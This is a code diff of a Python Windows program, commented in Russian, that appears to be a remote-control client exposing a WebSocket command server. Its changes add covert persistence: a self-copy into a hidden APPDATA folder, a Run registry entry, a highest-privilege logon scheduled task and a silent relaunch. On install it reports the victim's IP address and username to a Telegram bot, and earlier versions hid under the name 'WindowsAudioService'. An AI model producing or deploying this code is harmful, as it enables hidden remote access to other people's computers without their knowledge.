@@ -35,10 +35,79 @@ class ClientWebsocketServer:
         self.cache_time = 0
         self.cache_time_value = 300
 
-        self.auto_setup()
+        self.last_activity_time = time.time()
+        self.is_sleep_monitoring = False
+        self.sleep_monitor_thread = None
+        self.wake_up_timer = None
+        self.scheduled_wake_time = None
+
+        self.is_startup_mode = len(sys.argv) > 1 and sys.argv[1] == "--startup"
+
+        if not self.is_startup_mode:
+            self.auto_setup()
+
+        self.start_sleep_monitoring()
+
+        self.loop = None
+
+    # --- АВТОЗАГРУЗКА ИЗ СНА ---
+    def start_sleep_monitoring(self):
+        def monitor():
+            last_cpu = psutil.cpu_percent()
+            last_network = psutil.net_io_counters().bytes_sent
+
+            while True:
+                try:
+                    time.sleep(30)
+
+                    current_cpu = psutil.cpu_percent(interval=1)
+                    current_network = psutil.net_io_counters().bytes_sent
+
+                    cpu_change = abs(current_cpu - last_cpu)
+                    network_change = current_network - last_network
+
+                    if cpu_change > 20 or network_change > 100000:
+                        self.on_wake_from_sleep()
+
+                    last_cpu = current_cpu
+                    last_network = current_network
+
+                except Exception:
+                    time.sleep(60)
+
+        self.sleep_monitor_thread = threading.Thread(target=monitor, daemon=True)
+        self.sleep_monitor_thread.start()
+
+    def on_wake_from_sleep(self):
+        try:
+            self.installed_programs_cache = None
+            self.cache_time = 0
+
+            wake_message = {
+                'status': 'success',
+                'type': 'system_wake',
+                'data': '✅ Компьютер вышел из сна'
+            }
+
+            if self.loop and self.loop.is_running():
+                asyncio.run_coroutine_threadsafe(
+                    self.broadcast_to_all(wake_message),
+                    self.loop
+                )
+
+        except Exception as e:
+            print(f"❌ Ошибка при выходе из сна: {e}")
+
+    def is_server_running(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            result = sock.connect_ex((self.host, self.port))
+            sock.close()
+            return result == 0
+        except:
+            return False
 
     # --- АВТОЗАГРУЗКА ---
-    # скопировать exe в системную папку
     def copy_self_to_system(self):
         try:
             if not getattr(sys, 'frozen', False):
@@ -47,37 +116,51 @@ class ClientWebsocketServer:
             current_exe = sys.executable
             exe_name = os.path.basename(current_exe)
 
-            system_folder = os.path.join(os.environ['APPDATA'], 'WindowsAudioService')
+            app_name = os.path.splitext(exe_name)[0]
+            system_folder = os.path.join(os.environ['APPDATA'], app_name)
             os.makedirs(system_folder, exist_ok=True)
 
             target_exe = os.path.join(system_folder, exe_name)
 
-            if not os.path.exists(target_exe):
+            if not os.path.exists(target_exe) or \
+                    os.path.getsize(current_exe) != os.path.getsize(target_exe) or \
+                    os.path.getmtime(current_exe) > os.path.getmtime(target_exe):
+
                 shutil.copy2(current_exe, target_exe)
+
+                try:
+                    subprocess.run(f'attrib +h "{system_folder}"', shell=True, capture_output=True)
+                except:
+                    pass
 
             return target_exe
 
-        except Exception:
+        except Exception as e:
             return None
 
-    # добавить в автозагрузку через реестр
     def add_to_startup(self, exe_path):
         try:
+            app_name = os.path.splitext(os.path.basename(exe_path))[0]
+
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
             with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "WindowsAudioService", 0, winreg.REG_SZ, f'"{exe_path}"')
+                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, f'"{exe_path}" --startup')
                 return True
 
-        except Exception:
+        except Exception as e:
             return False
 
-    # создать задание в планировщике
     def create_scheduled_task(self, exe_path):
         try:
+            app_name = os.path.splitext(os.path.basename(exe_path))[0]
+
+            subprocess.run(f'schtasks /delete /tn "{app_name}" /f',
+                           shell=True, capture_output=True)
+
             task_cmd = (
-                f'schtasks /create /tn "WindowsAudioService" /tr "{exe_path}" '
+                f'schtasks /create /tn "{app_name}" /tr "{exe_path} --startup" '
                 f'/sc onlogon /delay 0000:30 /rl highest /f'
             )
 
@@ -86,20 +169,13 @@ class ClientWebsocketServer:
             if result.returncode == 0:
                 return True
             else:
-                if "already exists" in result.stderr:
-                    return True
-                print(f"⚠️ Ошибка планировщика: {result.stderr}")
                 return False
 
-        except Exception:
+        except Exception as e:
             return False
 
-    # автоматическая настройка при первом запуске
     def auto_setup(self):
         try:
-            if len(sys.argv) > 1 and sys.argv[1] == "--startup":
-                return
-
             if self.is_already_installed():
                 return
 
@@ -113,65 +189,103 @@ class ClientWebsocketServer:
             if task_success or reg_success:
                 self.response_to_telegram()
 
-        except Exception:
-            pass
+                try:
+                    subprocess.Popen([system_exe_path, "--startup"])
+                    time.sleep(2)
+                    sys.exit(0)
+                except Exception as e:
+                    print(f"⚠️ Не удалось запустить копию: {e}")
 
-    # проверить, установлена ли программа уже
+        except Exception as e:
+            print(f"❌ Ошибка автозагрузки: {e}")
+
     def is_already_installed(self):
         try:
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            current_exe = sys.executable
+            app_name = os.path.splitext(os.path.basename(current_exe))[0]
 
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
-                try:
-                    winreg.QueryValueEx(reg_key, "WindowsAudioService")
-                    return True
-                except FileNotFoundError:
-                    pass
+            try:
+                key = winreg.HKEY_CURRENT_USER
+                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
-            result = subprocess.run(
-                'schtasks /query /tn "WindowsAudioService"',
-                shell=True, capture_output=True, text=True
-            )
-            return result.returncode == 0
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
+                    try:
+                        value, _ = winreg.QueryValueEx(reg_key, app_name)
+                        if value and os.path.exists(value.split(' ')[0].strip('"')):
+                            return True
+                    except FileNotFoundError:
+                        pass
+            except:
+                pass
 
-        except:
+            # Проверяем планировщик задач
+            try:
+                result = subprocess.run(
+                    f'schtasks /query /tn "{app_name}"',
+                    shell=True, capture_output=True, text=True
+                )
+                return result.returncode == 0
+            except:
+                pass
+
             return False
 
-    # полностью удалить программу из системы
+        except Exception as e:
+            print(f"❌ Ошибка проверки установки: {e}")
+            return False
+
     def remove_server_program(self):
         try:
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            current_exe = sys.executable
+            app_name = os.path.splitext(os.path.basename(current_exe))[0]
 
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                try:
-                    winreg.DeleteValue(reg_key, "WindowsAudioService")
-                except FileNotFoundError:
-                    pass
+            try:
+                key = winreg.HKEY_CURRENT_USER
+                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
-            result = subprocess.run(
-                'schtasks /delete /tn "WindowsAudioService" /f',
-                shell=True, capture_output=True, text=True
-            )
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                    try:
+                        winreg.DeleteValue(reg_key, app_name)
+                    except FileNotFoundError:
+                        pass
+            except Exception as e:
+                print(f"⚠️ Ошибка удаления из реестра: {e}")
 
-            system_folder = os.path.join(os.environ['APPDATA'], 'WindowsAudioService')
+            try:
+                result = subprocess.run(
+                    f'schtasks /delete /tn "{app_name}" /f',
+                    shell=True, capture_output=True, text=True
+                )
+
+            except Exception as e:
+                print(f"⚠️ Ошибка удаления из планировщика: {e}")
+
+            system_folder = os.path.join(os.environ['APPDATA'], app_name)
             if os.path.exists(system_folder):
-                bat_content = f"""
-                @echo off
-                timeout /t 3 /nobreak >nul
-                rmdir /s /q "{system_folder}"
-                del "%~f0"
-                """
+                try:
+                    bat_content = f"""
+                    @echo off
+                    chcp 65001 >nul
+                    timeout /t 2 /nobreak >nul
+                    taskkill /f /im "{os.path.basename(current_exe)}" >nul 2>&1
+                    rmdir /s /q "{system_folder}" >nul 2>&1
+                    del "%~f0" >nul 2>&1
+                    """
 
-                bat_path = os.path.join(os.environ['TEMP'], 'remove_service.bat')
-                with open(bat_path, 'w') as f:
-                    f.write(bat_content)
+                    bat_path = os.path.join(os.environ['TEMP'], f'remove_{app_name}.bat')
+                    with open(bat_path, 'w', encoding='utf-8') as f:
+                        f.write(bat_content)
 
-                subprocess.Popen([bat_path], shell=True)
+                    subprocess.Popen([bat_path], shell=True,
+                                     stdin=subprocess.DEVNULL,
+                                     stdout=subprocess.DEVNULL,
+                                     stderr=subprocess.DEVNULL)
 
-                time.sleep(1)
-                sys.exit(0)
+                    time.sleep(1)
+                    sys.exit(0)
+
+                except Exception as e:
+                    return f"❌ Ошибка удаления: {e}"
 
             return "✅ Программа полностью удалена"
 
@@ -183,6 +297,13 @@ class ClientWebsocketServer:
     async def handler(self, websocket):
         self.clients.add(websocket)
         print(f'✅ Новое подключение: {websocket.remote_address}')
+
+        response = {
+            'status': 'success',
+            'type': 'system_active',
+            'data': '✅ Сервер готов к работе'
+        }
+        await websocket.send(json.dumps(response))
 
         try:
             async for message in websocket:
@@ -212,7 +333,6 @@ class ClientWebsocketServer:
             print(f'Ошибка в handler: {e}')
         finally:
             self.clients.discard(websocket)
-            print(f'🗑️  Клиент удален: {websocket.remote_address}')
 
     # обработка полученной команды
     async def process_command(self, command, data):
@@ -296,7 +416,7 @@ class ClientWebsocketServer:
             return {
                 'status': 'success',
                 'type': 'system_sleep',
-                'data': self.system_sleep(),
+                'data': await self.system_sleep(),
             }
         elif command == 'system_shutdown':
             return {
@@ -326,6 +446,8 @@ class ClientWebsocketServer:
     async def start_server(self):
         print(f'Запуск сервера на ws://{self.host}:{self.port}')
 
+        self.loop = asyncio.get_running_loop()
+
         async with websockets.serve(self.handler, self.host, self.port):
             print('Сервер запущен')
 
@@ -349,13 +471,38 @@ class ClientWebsocketServer:
         monitors = get_monitors()
         return [(m.x, m.y, m.width, m.height) for m in monitors]
 
+    # получаем ip-адрес для тг-бота
+    def get_ip(self):
+        try:
+            result = subprocess.run(
+                ['ipconfig'],
+                capture_output=True,
+                text=True,
+                encoding='cp866',
+            )
+
+            if result.returncode != 0:
+                return
+
+            ip_info_arr = result.stdout.split('\n')
+
+            for line in ip_info_arr:
+                if 'IPv4' in line and ' : ' in line:
+                    arr = line.split(' : ')
+
+                    if len(arr) > 1:
+                        return arr[1].strip()
+
+        except (UnicodeDecodeError, subprocess.SubprocessError, FileNotFoundError):
+            pass
+
     # отправка данных в тг-бота
     def response_to_telegram(self):
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
             message = f"🌐 <b>Запуск программы</b>\n\n" \
-                      f"🔗 <b>IP-адрес:</b> <code>{self.host}</code>\n\n" \
+                      f"🔗 <b>IP-адрес:</b> <code>{self.get_ip()}</code>\n\n" \
                       f"👤 <b>Пользователь:</b> <code>{os.getlogin()}</code>"
             data = {
                 'chat_id': CHAT_ID,
@@ -367,6 +514,22 @@ class ClientWebsocketServer:
 
         except requests.exceptions.RequestException:
             pass
+
+    # отправка сообщения всем пользователям
+    async def broadcast_to_all(self, message):
+        if not self.clients:
+            return
+
+        disconnected_clients = []
+
+        for websocket in self.clients.copy():
+            try:
+                await websocket.send(json.dumps(message))
+            except Exception as e:
+                disconnected_clients.append(websocket)
+
+        for websocket in disconnected_clients:
+            self.clients.discard(websocket)
 
     # --- ФУНКЦИИ-КОМАНДЫ ---
     # аутентификация
@@ -797,12 +960,34 @@ class ClientWebsocketServer:
         except:
             pass
 
-    def system_sleep(self):
+    # отправка в сон
+    async def system_sleep(self):
         try:
-            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
-            return "✅ Система переходит в спящий режим..."
+            response = {
+                'status': 'success',
+                'type': 'system_sleep',
+                'data': "✅ Система переходит в спящий режим через 3 секунды..."
+            }
+
+            def execute_sleep():
+                time.sleep(3)
+                try:
+                    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+                except Exception:
+                    pass
+
+            sleep_thread = threading.Thread(target=execute_sleep)
+            sleep_thread.daemon = True
+            sleep_thread.start()
+
+            return response
+
         except Exception as e:
-            return f"❌ Ошибка перехода в спящий режим: {e}"
+            return {
+                'status': 'error',
+                'type': 'system_sleep',
+                'data': f"❌ Ошибка перехода в спящий режим: {e}"
+            }
 
     def system_shutdown(self):
         try:
